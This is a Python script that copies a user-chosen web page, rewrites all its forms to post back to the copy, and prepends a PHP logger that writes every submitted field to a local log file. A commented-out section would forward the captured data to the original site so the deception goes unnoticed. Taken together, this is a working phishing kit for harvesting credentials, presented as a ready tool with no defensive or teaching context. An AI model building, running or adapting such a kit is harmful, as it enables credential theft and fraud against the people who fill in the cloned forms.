import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

def clone_webpage(url, output_dir="cloned_page"):
    # Create output folder if it doesn't exist
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    # Fetch the target URL
    response = requests.get(url)
    if response.status_code != 200:
        print(f"Failed to fetch {url}")
        return

    soup = BeautifulSoup(response.text, "html.parser")

    # Function to download assets (CSS, JS, images)
    def download_file(full_url, folder):
        parsed_url = urlparse(full_url)
        filename = os.path.basename(parsed_url.path)
        if not filename:
            return None
        folder_path = os.path.join(output_dir, folder)
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
        filepath = os.path.join(folder_path, filename)
        try:
            r = requests.get(full_url, timeout=10)
            if r.status_code == 200:
                with open(filepath, "wb") as f:
                    f.write(r.content)
                return os.path.join(folder, filename)
        except Exception as e:
            print(f"Could not download {full_url}: {e}")
        return None

    # Download all static files
    for tag, attr, folder in [
        ("link", "href", "css"),
        ("script", "src", "js"),
        ("img", "src", "images"),
    ]:
        for element in soup.find_all(tag):
            file_url = element.get(attr)
            if not file_url:
                continue
            full_url = urljoin(url, file_url)
            local_path = download_file(full_url, folder)
            if local_path:
                element[attr] = local_path

    # PHP logger (corrected to avoid white page)
    php_logger = f"""<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Log GET, POST, JSON locally
$data = "";
if (!empty($_POST) || !empty($_GET)) {{
    $data .= date("Y-m-d H:i:s") . " - " . json_encode($_REQUEST) . "\\n";
}}
$inputJSON = file_get_contents('php://input');
$input = json_decode($inputJSON, TRUE);
if ($input) {{
    $data .= date("Y-m-d H:i:s") . " - JSON: " . json_encode($input) . "\\n";
}}
if ($data) {{
    file_put_contents("log.txt", $data, FILE_APPEND);
}}

// Forwarding to original URL (optional, disabled for now)
// $original_url = "{url}";
// $ch = curl_init($original_url);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
//     curl_setopt($ch, CURLOPT_POST, true);
//     curl_setopt($ch, CURLOPT_POSTFIELDS, $_POST);
// }} elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {{
//     $get_query = http_build_query($_GET);
//     curl_setopt($ch, CURLOPT_URL, $original_url . '?' . $get_query);
// }}
// $result = curl_exec($ch);
// curl_close($ch);
// echo $result;
?>\n
"""

    # Modify all forms to submit to the cloned page itself
    for form in soup.find_all("form"):
        form["method"] = "POST"
        form["action"] = ""  # submit to cloned page for logging

    # Save final HTML as index.php
    output_file = os.path.join(output_dir, "index.php")
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(php_logger + str(soup))

    print(f"✅ Webpage cloned to '{output_dir}' with forms submitting to cloned page and logging locally.")


if __name__ == "__main__":
    target_url = input("Enter the URL of the webpage to clone: ")
    clone_webpage(target_url)
